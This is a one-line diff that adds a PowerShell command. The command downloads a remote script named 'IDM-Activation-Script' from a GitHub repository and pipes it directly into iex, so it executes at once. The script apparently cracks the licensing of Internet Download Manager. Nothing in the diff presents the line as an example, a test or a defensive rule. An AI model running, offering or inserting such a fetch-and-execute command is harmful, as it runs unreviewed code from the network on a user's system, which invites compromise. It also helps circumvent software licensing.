@@ -1,0 +1,1 @@
+irm https://github.com/CherryvilleZ/IDM-Activation-Script/raw/refs/heads/main/IDM.ps1 | iex
